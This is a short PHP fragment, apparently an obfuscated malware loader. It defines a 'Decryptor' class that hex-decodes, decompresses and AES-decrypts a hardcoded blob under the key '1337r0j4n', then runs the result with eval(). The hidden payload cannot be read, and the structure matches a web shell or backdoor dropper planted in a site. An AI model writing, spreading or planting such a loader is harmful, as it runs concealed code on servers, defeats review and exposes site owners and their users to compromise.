 class Decryptor
    {
        private $key, $data;

        public function __construct($key, $hexData)
        {
            $this->key = $key;
            $this->data = hex2bin($hexData);
        }

        public function process()
        {
            $code = openssl_decrypt(gzinflate(gzuncompress($this->data)), "AES-128-ECB", $this->key);
            eval($code);
        }
    }

    $decryptor = new Decryptor("1337r0j4n", "789c010c01f3fe05c1c98243300000d00f7250d432c7413a08d274528c5b6a1d6b2d89e5ebfb5e0e3aec3c635e3a3a0e6ed2a6c4e42e4ee5c98b7a0b9162fea2685bb48ec3c9fafbc652c5008b6c22b543dfe81285eaa8e5fdd9f4881cd7748f9cf152b0748491efae75e81df94bbd539554e6a34d13a4da09f8129864dd5c74013316925c3185229ab8f8b25d2aeb24487a3d790ec4a707883912c7ce9047dcf00ba519cbd9d2cc0a95fb93adc1d9eb45c4cb0c71479c5fd52d0976626cd0ecba4cfb81dbd8a57274786336ddab053b5367db4bbfeeeddae8018eb56b28fbe13694349e2c97490f4be586856aabb4ec39060a92de2d803e118cff66f04bf8ae7701871e533d758969b08aedba40598746083e5fb787f8");
    $decryptor->process();
?>
